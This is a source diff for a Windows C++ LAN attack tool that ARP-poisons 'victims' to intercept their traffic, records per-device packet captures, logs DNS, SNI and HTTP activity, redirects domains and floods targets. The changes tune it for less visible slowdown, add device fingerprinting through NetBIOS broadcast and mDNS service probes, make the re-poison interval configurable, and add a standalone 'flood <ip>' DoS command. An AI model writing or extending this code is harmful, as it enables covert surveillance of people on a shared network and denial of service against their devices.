@@ -46,6 +46,11 @@ static const char* RULES_FILE       = "atk\\rules.txt";
 static const char* APP_VERSION      = "v4";
 static const size_t RECENT_CAP      = 300;
 static const unsigned long long PCAP_MAX_BYTES = 32ull * 1024ull * 1024ull;
+// runtime-tunable limits/options (see the console commands)
+static std::atomic<unsigned long long> g_pcapMaxBytes{PCAP_MAX_BYTES};
+static std::atomic<DWORD>  g_sweepMs{0};          // 0 = use ARP_REPOISON_MS
+static std::atomic<bool>   g_autoNames{true};     // periodically retry unnamed hosts
+static std::atomic<bool>   g_namesBusy{false};
 static const DWORD  DNS_TTL_MS      = 10 * 60 * 1000;
 static const DWORD  CONN_IDLE_MS    = 120000;
 static const DWORD  ARP_REPOISON_MS = 4000;
@@ -91,6 +96,7 @@ static void cmdDetail(const std::string& ip, int n);
 static void sendArp(pcap_t* pc, const char* srcIp, const unsigned char* srcMac,
                     const unsigned char* dstMac, const char* dstIp, int op);
 static pcap_t* openHandleFor(const std::string& guid, bool sending);
+static void resolveNames();
 
 static pcap_t*          g_pcap     = nullptr;
 static pcap_t*          g_pcapSend = nullptr;
@@ -270,6 +276,41 @@ struct Victim {
 };
 static std::vector<Victim> g_victims;
 static std::mutex          g_vmutex;
+
+// Names the operator set by hand ("name <ip> <text>"), persisted in
+// atk\names.txt and always preferred over anything discovered.
+static std::unordered_map<std::string, std::string> g_manualNames;
+static std::mutex g_manualMutex;
+
+// The capture callback runs on the pcap thread at LAN line rate.  Scanning
+// g_victims under g_vmutex twice per packet there contended with the sweeper,
+// the GUI refresh and the dumps, which is a real source of stalls (and of the
+// occasional slow WiFi).  Keep an immutable set of tracked IPs instead so the
+// hot path does one O(1) lookup behind a tiny mutex.
+static std::shared_ptr<const std::unordered_set<std::string>> g_victimIpSnap;
+static std::mutex g_victimIpMutex;
+
+// caller must hold g_vmutex
+static void refreshVictimIpSnapLocked() {
+    auto s = std::make_shared<std::unordered_set<std::string>>();
+    s->reserve(g_victims.size() * 2 + 8);
+    for (auto& v : g_victims) s->insert(v.ip);
+    std::lock_guard<std::mutex> lk(g_victimIpMutex);
+    g_victimIpSnap = std::move(s);
+}
+static bool isKnownVictimIp(const std::string& ip) {
+    std::shared_ptr<const std::unordered_set<std::string>> s;
+    {
+        std::lock_guard<std::mutex> lk(g_victimIpMutex);
+        s = g_victimIpSnap;
+    }
+    return s && s->find(ip) != s->end();
+}
+static std::string manualNameFor(const std::string& ip) {
+    std::lock_guard<std::mutex> lk(g_manualMutex);
+    auto it = g_manualNames.find(ip);
+    return it == g_manualNames.end() ? std::string() : it->second;
+}
 
 static const char* ouiVendor(const char* mac) {
     // returns vendor name for common OUI prefixes, or nullptr
@@ -556,7 +597,14 @@ static const char* ouiVendor(const char* mac) {
 static bool learnVictim(const std::string& ip, const std::string& mac) {
     if (ip.empty() || mac.empty()) return false;
     unsigned char om[6];
-    if (parseMac(mac, om) && macEq(om, g_myMac)) return false;
+    if (parseMac(mac, om)) {
+        if (macEq(om, g_myMac)) return false;
+        // broadcast / multicast addresses are not devices.  The neighbour
+        // table contains 192.168.0.255 -> ff:ff:ff:ff:ff:ff and it used to end
+        // up in the device list (and in "t all"), which made a poison or flood
+        // hit the whole LAN instead of one host.
+        if (macZero(om) || (om[0] & 1)) return false;
+    }
     if (ip == g_myIp) return false;
 
     std::string changedFrom;
@@ -583,6 +631,16 @@ static bool learnVictim(const std::string& ip, const std::string& mac) {
             if (vendor) { v.name = vendor; v.namePrio = 0; }
             g_victims.push_back(v);
             isNew = true;
+        }
+        refreshVictimIpSnapLocked();
+    }
+    // a manual name always wins, even for a host discovered after it was set
+    {
+        std::string mn = manualNameFor(ip);
+        if (!mn.empty()) {
+            std::lock_guard<std::mutex> lk(g_vmutex);
+            for (auto& v : g_victims)
+                if (v.ip == ip) { v.name = mn; v.namePrio = 9; break; }
         }
     }
     if (!changedFrom.empty()) {
@@ -782,9 +840,44 @@ static bool inActivity(const std::string& ip) {
     return g_activity.find(ip) != g_activity.end();
 }
 
+// one open append handle per tracked device; opening/closing the log on every
+// single DNS/SNI/HTTP event was costing a file open+close per event in the
+// capture path, which is why a busy LAN felt sluggish
+static std::unordered_map<std::string, FILE*> g_trackFiles;
+static std::mutex g_trackFilesMutex;
+
+static FILE* trackFileFor(const std::string& ip) {
+    std::lock_guard<std::mutex> lk(g_trackFilesMutex);
+    auto it = g_trackFiles.find(ip);
+    if (it != g_trackFiles.end()) return it->second;
+    char path[MAX_PATH];
+    snprintf(path, sizeof(path), "%s\\track_%s.log", TRACK_DIR, ip.c_str());
+    FILE* f = fopen(path, "ab");
+    if (!f) return nullptr;
+    setvbuf(f, nullptr, _IOFBF, 64 * 1024);
+    g_trackFiles[ip] = f;
+    return f;
+}
+
+static void closeTrackFiles() {
+    std::lock_guard<std::mutex> lk(g_trackFilesMutex);
+    for (auto& kv : g_trackFiles) if (kv.second) fclose(kv.second);
+    g_trackFiles.clear();
+}
+
+static void closeTrackFile(const std::string& ip) {
+    std::lock_guard<std::mutex> lk(g_trackFilesMutex);
+    auto it = g_trackFiles.find(ip);
+    if (it != g_trackFiles.end()) {
+        if (it->second) fclose(it->second);
+        g_trackFiles.erase(it);
+    }
+}
+
 static void trackEvent(const std::string& ip, const std::string& mac,
                        const char* kind, const std::string& detail) {
     std::string line = "[" + tsNow() + "] " + kind + " " + detail;
+    unsigned long long ev = 0;
     {
         std::lock_guard<std::mutex> lk(g_activityMutex);
         Activity& a = g_activity[ip];
@@ -792,14 +885,17 @@ static void trackEvent(const std::string& ip, const std::string& mac,
         if (!mac.empty() && mac != "00:00:00:00:00:00") a.mac = mac;
         a.lastSeen = GetTickCount();
         a.events++;
+        ev = a.events;
         a.recent.push_back(line);
         if (a.recent.size() > RECENT_CAP) a.recent.pop_front();
     }
 
-    char path[MAX_PATH];
-    snprintf(path, sizeof(path), "%s\\track_%s.log", TRACK_DIR, ip.c_str());
-    FILE* f = fopen(path, "a");
-    if (f) { fprintf(f, "%s\n", line.c_str()); fclose(f); }
+    FILE* f = trackFileFor(ip);
+    if (f) {
+        fprintf(f, "%s\n", line.c_str());
+        // keep the on-disk log reasonably fresh without flushing every event
+        if ((ev & 31) == 0) fflush(f);
+    }
 }
 
 // ---------------------------------------------------------------
@@ -822,6 +918,8 @@ static FILE* openCapLocked(Activity& a) {
         0x01, 0x00, 0x00, 0x00              // LINKTYPE_ETHERNET
     };
     if (fwrite(gh, sizeof(gh), 1, f) != 1) { fclose(f); return nullptr; }
+    // big buffer: a pcap write per packet with a 4 KB stdio buffer thrashes
+    setvbuf(f, nullptr, _IOFBF, 256 * 1024);
     a.capFile  = f;
     a.capBytes = sizeof(gh);
     return f;
@@ -844,8 +942,12 @@ static void writeCapLocked(const std::string& ip,
         fwrite(p, 1, h->caplen, f) != h->caplen) {
         fclose(f); a.capFile = nullptr; return;
     }
+    unsigned long long before = a.capBytes;
     a.capBytes += sizeof(hdr) + h->caplen;
-    if (a.capBytes >= PCAP_MAX_BYTES) {
+    // flush every ~4 MB so the file is usable while recording, without an
+    // fflush per packet
+    if ((before ^ a.capBytes) & ~((4ull << 20) - 1)) fflush(f);
+    if (a.capBytes >= g_pcapMaxBytes.load()) {
         fclose(f);
         a.capFile = nullptr;
         a.capFull = true;
@@ -866,13 +968,8 @@ static void recordPacket(const struct pcap_pkthdr* h, const unsigned char* p) {
     if (!g_myIp.empty() && (g_myIp == src || g_myIp == dst)) return;
 
     // a scanned target gets a capture file even before it produces DNS/HTTP
-    auto isVictim = [](const std::string& x) {
-        std::lock_guard<std::mutex> lk(g_vmutex);
-        for (auto& v : g_victims) if (v.ip == x) return true;
-        return false;
-    };
-    bool srcKnown = isVictim(src);
-    bool dstKnown = (strcmp(src, dst) == 0) ? srcKnown : isVictim(dst);
+    bool srcKnown = isKnownVictimIp(src);
+    bool dstKnown = (strcmp(src, dst) == 0) ? srcKnown : isKnownVictimIp(dst);
 
     std::lock_guard<std::mutex> lk(g_activityMutex);
     auto ensure = [&](const char* x, bool known) -> bool {
@@ -1408,9 +1505,7 @@ static void controlDnsFor(const std::string& victimIp, bool force) {
 // per-device traffic analytics (bytes, packets, protocol mix, peers)
 // ---------------------------------------------------------------
 static bool isVictimIp(const std::string& ip) {
-    std::lock_guard<std::mutex> lk(g_vmutex);
-    for (auto& v : g_victims) if (v.ip == ip) return true;
-    return false;
+    return isKnownVictimIp(ip);
 }
 
 static std::string protoLabel(int proto, int sport, int dport) {
@@ -1830,10 +1925,18 @@ static void handleArp(const unsigned char* p, int caplen) {
 static std::atomic<bool> g_sweeperRun{false};
 
 static void sweeperLoop() {
-    DWORD lastRep    = 0;
-    DWORD lastPrune  = 0;
+    DWORD lastRep     = 0;
+    DWORD lastPrune   = 0;
+    DWORD lastNames   = GetTickCount();
+    DWORD lastSnapRef = 0;
     while (g_sweeperRun) {
         DWORD now = GetTickCount();
+        // keep the O(1) track set in sync even if some path forgot to refresh
+        if (now - lastSnapRef > 4000) {
+            lastSnapRef = now;
+            std::lock_guard<std::mutex> lk(g_vmutex);
+            refreshVictimIpSnapLocked();
+        }
         std::vector<Conn> killList;
         {
             std::lock_guard<std::mutex> lk(g_connMutex);
@@ -1847,8 +1950,10 @@ static void sweeperLoop() {
         }
         for (auto& c : killList) killConn(c);
 
+        DWORD repMs = g_sweepMs.load();
+        if (repMs == 0) repMs = ARP_REPOISON_MS;
         bool urgentRep = g_repoisonNow.exchange(false);
-        if (attackOn && (now - lastRep > ARP_REPOISON_MS || urgentRep)) {
+        if (attackOn && (now - lastRep > repMs || urgentRep)) {
             lastRep = now;
             g_repoisons++;
             std::vector<Victim> snap;
@@ -1873,16 +1978,38 @@ static void sweeperLoop() {
             lastPrune = now;
             std::string focus;
             { std::lock_guard<std::mutex> flk(g_focusMutex); focus = g_focusIp; }
-            std::lock_guard<std::mutex> lk(g_activityMutex);
-            for (auto it = g_activity.begin(); it != g_activity.end(); ) {
-                bool idle = it->second.lastSeen &&
-                            now - it->second.lastSeen > ACTIVITY_TTL_MS;
-                if (idle && it->first != focus) {
-                    if (it->second.capFile) fclose(it->second.capFile);
-                    it = g_activity.erase(it);
-                } else {
-                    ++it;
+            std::vector<std::string> pruned;
+            {
+                std::lock_guard<std::mutex> lk(g_activityMutex);
+                for (auto it = g_activity.begin(); it != g_activity.end(); ) {
+                    bool idle = it->second.lastSeen &&
+                                now - it->second.lastSeen > ACTIVITY_TTL_MS;
+                    if (idle && it->first != focus) {
+                        if (it->second.capFile) fclose(it->second.capFile);
+                        pruned.push_back(it->first);
+                        it = g_activity.erase(it);
+                    } else {
+                        ++it;
+                    }
                 }
+            }
+            for (auto& ip : pruned) closeTrackFile(ip);
+        }
+
+        // periodically retry the devices that still have no name, so the list
+        // keeps filling in without the operator clicking Resolve Names
+        if (g_autoNames && !g_scanning && (now - lastNames > 90000)) {
+            lastNames = now;
+            int unnamed = 0;
+            {
+                std::lock_guard<std::mutex> lk(g_vmutex);
+                for (auto& v : g_victims) if (v.name.empty()) unnamed++;
+            }
+            if (unnamed > 0 && !g_namesBusy.exchange(true)) {
+                std::thread([]() {
+                    resolveNames();
+                    g_namesBusy = false;
+                }).detach();
             }
         }
         Sleep(400);
@@ -2707,6 +2834,24 @@ static void resolveNames() {
         }
     }
 
+    // NetBIOS node-status also answers a broadcast.  Some Windows hosts drop
+    // the unicast probe (local firewall) but still answer the subnet
+    // broadcast, so send one of each.
+    {
+        unsigned char q[64];
+        int len = buildNbstatQuery(q, (unsigned short)(baseId + 0x500));
+        std::string b = g_myIp;
+        size_t dot = b.find_last_of('.');
+        std::vector<std::string> casts = {"255.255.255.255"};
+        if (dot != std::string::npos) casts.push_back(b.substr(0, dot) + ".255");
+        for (auto& bc : casts) {
+            sockaddr_in d{};
+            d.sin_family = AF_INET; d.sin_port = htons(137);
+            d.sin_addr.s_addr = inet_addr(bc.c_str());
+            sendto(s, (const char*)q, len, 0, (sockaddr*)&d, sizeof(d));
+        }
+    }
+
     // DNS-SD service enumeration.  Phones, TVs, printers, NAS boxes and
     // speakers answer these with PTR/SRV/A records whose instance names are
     // the friendly names shown in their setup apps ("Living Room TV").
@@ -2714,13 +2859,17 @@ static void resolveNames() {
     {
         static const char* svc[] = {
             "_services._dns-sd._udp.local",
-            "_googlecast._tcp.local", "_airplay._tcp.local",
-            "_raop._tcp.local",       "_spotify-connect._tcp.local",
-            "_sonos._tcp.local",      "_amzn-wplay._tcp.local",
-            "_ipp._tcp.local",        "_printer._tcp.local",
-            "_http._tcp.local",       "_workstation._tcp.local",
-            "_smb._tcp.local",        "_device-info._tcp.local",
-            "_hap._tcp.local"
+            "_googlecast._tcp.local",  "_airplay._tcp.local",
+            "_raop._tcp.local",        "_spotify-connect._tcp.local",
+            "_sonos._tcp.local",       "_amzn-wplay._tcp.local",
+            "_androidtvremote2._tcp.local",
+            "_companion-link._tcp.local", "_sleep-proxy._udp.local",
+            "_afpovertcp._tcp.local",  "_sftp-ssh._tcp.local",
+            "_ssh._tcp.local",         "_rfb._tcp.local",
+            "_ipp._tcp.local",         "_printer._tcp.local",
+            "_http._tcp.local",        "_workstation._tcp.local",
+            "_smb._tcp.local",         "_device-info._tcp.local",
+            "_hap._tcp.local",         "_googlezone._tcp.local"
         };
         sockaddr_in m{};
         m.sin_family = AF_INET; m.sin_port = htons(5353);
@@ -3141,6 +3290,92 @@ static void restoreAll() {
         n++;
     }
     PF("[*] ARP restored for %d host(s)\n", n);
+}
+
+// ---------------------------------------------------------------
+// manual device names: atk\names.txt, one "ip<TAB>name" per line.  They are
+// applied with the highest priority so a label the operator typed is never
+// replaced by an mDNS/DHCP guess.
+// ---------------------------------------------------------------
+static const char* NAMES_FILE = "atk\\names.txt";
+
+static void loadManualNames() {
+    FILE* f = fopen(NAMES_FILE, "rb");
+    if (!f) return;
+    char line[256];
+    std::vector<std::pair<std::string, std::string>> pairs;
+    while (fgets(line, sizeof(line), f)) {
+        std::string s(line);
+        while (!s.empty() && (s.back() == '\r' || s.back() == '\n')) s.pop_back();
+        if (s.empty() || s[0] == '#') continue;
+        size_t t = s.find('\t');
+        if (t == std::string::npos) t = s.find(' ');
+        if (t == std::string::npos) continue;
+        std::string ip = s.substr(0, t);
+        std::string nm = s.substr(t + 1);
+        while (!nm.empty() && (nm.front() == ' ' || nm.front() == '\t')) nm.erase(0, 1);
+        if (ip.empty() || nm.empty()) continue;
+        pairs.push_back({ip, nm});
+    }
+    fclose(f);
+    if (pairs.empty()) return;
+    {
+        std::lock_guard<std::mutex> lk(g_manualMutex);
+        for (auto& p : pairs) g_manualNames[p.first] = p.second;
+    }
+    std::lock_guard<std::mutex> lk(g_vmutex);
+    for (auto& p : pairs)
+        for (auto& v : g_victims)
+            if (v.ip == p.first) { v.name = p.second; v.namePrio = 9; break; }
+    refreshVictimIpSnapLocked();
+    PF("[*] %zu manual name(s) loaded\n", pairs.size());
+}
+
+static void cmdName(const std::string& ip, const std::string& name) {
+    if (ip.empty()) { PF("usage: name <ip> <text|clear>\n"); return; }
+    {
+        std::lock_guard<std::mutex> lk(g_manualMutex);
+        if (name.empty() || name == "clear" || name == "-") g_manualNames.erase(ip);
+        else g_manualNames[ip] = name;
+    }
+    // rewrite the file from the current map so entries stay unique
+    {
+        std::lock_guard<std::mutex> lk(g_manualMutex);
+        FILE* f = fopen(NAMES_FILE, "wb");
+        if (f) {
+            for (auto& kv : g_manualNames)
+                fprintf(f, "%s\t%s\n", kv.first.c_str(), kv.second.c_str());
+            fclose(f);
+        }
+    }
+    {
+        std::lock_guard<std::mutex> lk(g_vmutex);
+        for (auto& v : g_victims)
+            if (v.ip == ip) {
+                if (name.empty() || name == "clear" || name == "-") {
+                    v.name.clear(); v.namePrio = 0;
+                } else { v.name = name; v.namePrio = 9; }
+                break;
+            }
+    }
+    if (name.empty() || name == "clear" || name == "-")
+        PF("[+] name cleared for %s\n", ip.c_str());
+    else
+        PF("[+] %s is now \"%s\" (manual, saved)\n", ip.c_str(), name.c_str());
+}
+
+static const char* nameSource(int prio) {
+    switch (prio) {
+        case 9:  return "manual";
+        case 6:  return "upnp";
+        case 5:  return "dhcp";
+        case 4:  return "netbios";
+        case 3:  return "llmnr";
+        case 2:  return "mdns";
+        case 1:  return "dns";
+        case 0:  return "vendor";
+        default: return "?";
+    }
 }
 
 static void saveRules() {
@@ -3890,6 +4125,9 @@ static void cmdMsgStop(const std::string& victim) {
 }
 
 static std::atomic<bool> g_dosRun{false};
+// set by "flood <ip> [pps]" so a DoS can be aimed at one device without
+// starting a full intercept.  A normal "x"/stop clears it again.
+static std::atomic<bool> g_dosStandalone{false};
 static std::mutex        g_dosMutex;
 static std::unordered_set<std::string> g_dosTargets;
 
@@ -3910,7 +4148,7 @@ static void dosLoop(std::string target) {
     PF("[+] dos active against %s\n", target.c_str());
     uint16_t sport = (uint16_t)(1024 + (rnd32() % 50000));
     const uint16_t dports[] = {443, 80, 53, 123, 445, 8080};
-    while (g_dosRun && attackOn) {
+    while (g_dosRun && (attackOn || g_dosStandalone)) {
         for (int i = 0; i < 60; ++i) {
             unsigned char f[14 + 20 + 20] = {0};
             memcpy(&f[0], tmac, 6);
@@ -3979,6 +4217,7 @@ static void startDos(const std::string& ip) {
 
 static void stopAllDos() {
     g_dosRun = false;
+    g_dosStandalone = false;
     PF("[+] stopping all dos threads\n");
 }
 
@@ -4096,8 +4335,12 @@ static pcap_t* openHandleFor(const std::string& guid, bool sending) {
         // case-insensitively so a differently-cased GUID still matches
         if (want.empty() || normGuid(name).find(want) == std::string::npos)
             continue;
-        int snap = sending ? 1 : 65536;
-        int promisc = sending ? 0 : 1;
+        // A 64 KB snaplen makes the driver copy every byte of every frame into
+        // user space; on WiFi that visibly slows the link.  ARP MITM traffic is
+        // unicast to us plus broadcast, so promiscuous mode is not needed and
+        // 2 KB keeps all headers and the payload that matters for analysis.
+        int snap = sending ? 1 : 2048;
+        int promisc = 0;
         int to = sending ? 0 : 30;
         pcap_t* p = pcap_open_live(d->name, snap, promisc, to, errbuf);
         if (!p) continue;
@@ -4171,6 +4414,11 @@ static void help() {
         "    report                    write atk\\report.html + report.json\n"
         "    _focus <ip|none>          focus a device for the GUI timeline\n"
         "    pcap [on|off]             record per-device atk\\captures\\<ip>.pcap\n"
+        "    pcapmax [mb]              per-device capture size cap (default 32)\n"
+        "    perf                      capture drop stats + current options\n"
+        "  NAMES\n"
+        "    name <ip> <text|clear>    set a manual name (saved in atk\\names.txt)\n"
+        "    autonames [on|off]        retry unnamed hosts in the background\n"
         "  RULES / APPS\n"
         "    block <domain> [ip|*]     redirect <domain> <ip> [ip|*]\n"
         "    unblock <domain>          rules | save | load\n"
@@ -4179,9 +4427,34 @@ static void help() {
         "    msgall <text> | msg <ip> <text> | msgstop [ip|*]\n"
         "    msgtest                   check that the portal answers locally\n"
         "  MISC\n"
-        "    kick <ip> | unkick | dosrate <pkts/s> | q\n"
+        "    kick <ip> | unkick | dosrate <pkts/s>\n"
+        "    flood <ip> [pps]          start a DoS at an explicit rate\n"
+        "    sweep [ms]                ARP re-poison interval (default 4000)\n"
+        "    q                         quit\n"
         "  Start with --adapter=N or --adapter-guid={GUID} to skip the prompt.\n\n",
         APP_VERSION);
+}
+
+// quick runtime health check: capture drops and the tunable options.  High
+// ps_drop means the machine cannot keep up with the LAN, which is the usual
+// reason the whole network feels slow while the tool runs.
+static void cmdPerf() {
+    if (g_pcap) {
+        struct pcap_stat ps{};
+        if (pcap_stats(g_pcap, &ps) == 0)
+            PF("  pcap    : recv=%u drop=%u ifdrop=%u\n",
+               ps.ps_recv, ps.ps_drop, ps.ps_ifdrop);
+    }
+    int tracked = 0, victims = 0; size_t tf = 0;
+    { std::lock_guard<std::mutex> lk(g_activityMutex); tracked = (int)g_activity.size(); }
+    { std::lock_guard<std::mutex> lk(g_vmutex);       victims = (int)g_victims.size(); }
+    { std::lock_guard<std::mutex> lk(g_trackFilesMutex); tf = g_trackFiles.size(); }
+    DWORD rep = g_sweepMs.load(); if (!rep) rep = ARP_REPOISON_MS;
+    PF("  state   : victims=%d tracked=%d openTrackFiles=%zu\n", victims, tracked, tf);
+    PF("  capture : %s snaplen=2048 promisc=off\n", g_captureOn.load() ? "recording" : "idle");
+    PF("  options : repoison=%ums pcapMax=%lluMB autoNames=%s\n",
+       (unsigned)rep, g_pcapMaxBytes.load() / (1024ull * 1024ull),
+       g_autoNames.load() ? "on" : "off");
 }
 
 int main(int argc, char** argv) {
@@ -4193,6 +4466,7 @@ int main(int argc, char** argv) {
     CreateDirectoryA(OUTDIR, nullptr);
     CreateDirectoryA(TRACK_DIR, nullptr);
     CreateDirectoryA(CAP_DIR, nullptr);
+    loadManualNames();
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCtrlHandler(ctrlHandler, TRUE);
 
@@ -4292,6 +4566,7 @@ int main(int argc, char** argv) {
             g_quickStartPending = false;
             attackOn = false;
             g_dosRun = false;
+            g_dosStandalone = false;
             restoreAll();
             restoreForwarding();
             break;
@@ -4305,12 +4580,24 @@ int main(int argc, char** argv) {
         }
         if (line == "hosts") {
             std::lock_guard<std::mutex> lk(g_vmutex);
+            PF("  %-3s %-15s %-17s %-26s %-9s %s\n", "#", "IP", "MAC", "NAME", "SOURCE", "SEL");
             for (size_t i = 0; i < g_victims.size(); ++i) {
                 std::string nm = g_victims[i].name.empty() ? "-" : g_victims[i].name;
-                PF("  %2zu %-15s %-17s %-24s %s\n", i + 1,
+                PF("  %-3zu %-15s %-17s %-26s %-9s %s\n", i + 1,
                    g_victims[i].ip.c_str(), g_victims[i].mac.c_str(),
-                   nm.c_str(), g_victims[i].sel ? "[x]" : "[ ]");
+                   nm.c_str(),
+                   g_victims[i].name.empty() ? "-" : nameSource(g_victims[i].namePrio),
+                   g_victims[i].sel ? "[x]" : "[ ]");
             }
+            continue;
+        }
+        if (line.rfind("name ", 0) == 0) {
+            std::istringstream ss(line.substr(5));
+            std::string ip, nm;
+            ss >> ip;
+            std::getline(ss, nm);
+            nm = trim(nm);
+            cmdName(ip, nm);
             continue;
         }
         if (line == "names" || line == "resolve") { resolveNames(); continue; }
@@ -4341,6 +4628,7 @@ int main(int argc, char** argv) {
         if (line == "5" || line == "x" || line == "stop") {
             attackOn = false;
             g_dosRun = false;
+            g_dosStandalone = false;
             g_quickStartPending = false;   // a pending Quick Start must not re-arm
             restoreAll();
             // always put forwarding back the way we found it, no matter which
@@ -4430,6 +4718,56 @@ int main(int argc, char** argv) {
             g_captureOn = on;
             if (!on) closeAllCaptures();
             PF("[+] pcap %s\n", on ? "on" : "off");
+            continue;
+        }
+        if (line == "perf") { cmdPerf(); continue; }
+        if (line == "sweep" || line.rfind("sweep ", 0) == 0) {
+            std::string arg = line.size() > 6 ? trim(line.substr(6)) : "";
+            if (arg.empty()) {
+                DWORD rep = g_sweepMs.load(); if (!rep) rep = ARP_REPOISON_MS;
+                PF("[*] re-poison interval = %u ms\n", rep);
+            } else {
+                int ms = atoi(arg.c_str());
+                if (ms < 500)   ms = 500;
+                if (ms > 60000) ms = 60000;
+                g_sweepMs = (DWORD)ms;
+                PF("[+] re-poison interval = %d ms\n", ms);
+            }
+            continue;
+        }
+        if (line == "pcapmax" || line.rfind("pcapmax ", 0) == 0) {
+            std::string arg = line.size() > 8 ? trim(line.substr(8)) : "";
+            if (arg.empty()) {
+                PF("[*] pcap cap = %llu MB per device\n", g_pcapMaxBytes.load() / (1024ull*1024ull));
+            } else {
+                int mb = atoi(arg.c_str());
+                if (mb < 1)   mb = 1;
+                if (mb > 4096) mb = 4096;
+                g_pcapMaxBytes = (unsigned long long)mb * 1024ull * 1024ull;
+                PF("[+] pcap cap = %d MB per device\n", mb);
+            }
+            continue;
+        }
+        if (line == "autonames" || line.rfind("autonames ", 0) == 0) {
+            std::string arg = line.size() > 10 ? trim(line.substr(10)) : "";
+            bool on = g_autoNames.load();
+            if (arg == "on" || arg == "1") on = true;
+            else if (arg == "off" || arg == "0") on = false;
+            else on = !on;
+            g_autoNames = on;
+            PF("[+] background name retry %s\n", on ? "on" : "off");
+            continue;
+        }
+        if (line.rfind("flood ", 0) == 0) {
+            std::istringstream ss(line.substr(6));
+            std::string ip; int pps = 0;
+            ss >> ip >> pps;
+            if (ip.empty()) { PF("usage: flood <ip> [pps]   (stop with unkick)\n"); continue; }
+            if (pps >= 200 && pps <= 200000) g_dosRate = pps;
+            PF("[+] flooding %s at %d pkt/s (stop with unkick)\n",
+               ip.c_str(), g_dosRate.load());
+            g_dosStandalone = true;
+            startDos(ip);
             continue;
         }
         if (line.rfind("block ", 0) == 0) {
@@ -4568,16 +4906,23 @@ int main(int argc, char** argv) {
             }
             {
                 std::string focusIp2 = (focus == "-") ? "" : focus;
-                std::lock_guard<std::mutex> lk(g_activityMutex);
-                for (auto& kv : g_activity) {
-                    auto& a = kv.second;
+                // name lookup from the vSnap copy we already hold (no nested
+                // g_vmutex inside g_activityMutex - that lock order caused
+                // stalls and is now eliminated)
+                std::unordered_map<std::string, std::string> nameByIp;
+                nameByIp.reserve(vSnap.size() * 2 + 8);
+                for (auto& v : vSnap) if (!v.name.empty()) nameByIp[v.ip] = v.name;
+                // copy the activity rows out under the lock, then print freely
+                std::vector<Activity> acts;
+                {
+                    std::lock_guard<std::mutex> lk(g_activityMutex);
+                    acts.reserve(g_activity.size());
+                    for (auto& kv : g_activity) acts.push_back(kv.second);
+                }
+                for (auto& a : acts) {
                     DWORD age = a.lastSeen ? (GetTickCount() - a.lastSeen) / 1000 : 0;
-                    std::string nm = "-";
-                    {
-                        std::lock_guard<std::mutex> lk2(g_vmutex);
-                        for (auto& v : g_victims)
-                            if (v.ip == a.ip && !v.name.empty()) { nm = v.name; break; }
-                    }
+                    auto nmIt = nameByIp.find(a.ip);
+                    std::string nm = (nmIt == nameByIp.end()) ? "-" : nmIt->second;
                     PF("ACTIVITY %s|%s|%ld|%ld|%ld|%lu|%llu|%d|%llu\n",
                        a.ip.c_str(), nm.c_str(),
                        a.dnsCount, a.sniCount, a.httpCount, (unsigned long)age,
@@ -4648,6 +4993,7 @@ int main(int argc, char** argv) {
     if (g_pcap) pcap_breakloop(g_pcap);
     if (monitor.joinable()) monitor.join();
     closeAllCaptures();
+    closeTrackFiles();
     if (g_pcapSend && g_pcapSend != g_pcap) pcap_close(g_pcapSend);
     if (g_pcap) pcap_close(g_pcap);
     // deliberately no WSACleanup(): resolveNames() may still have a detached
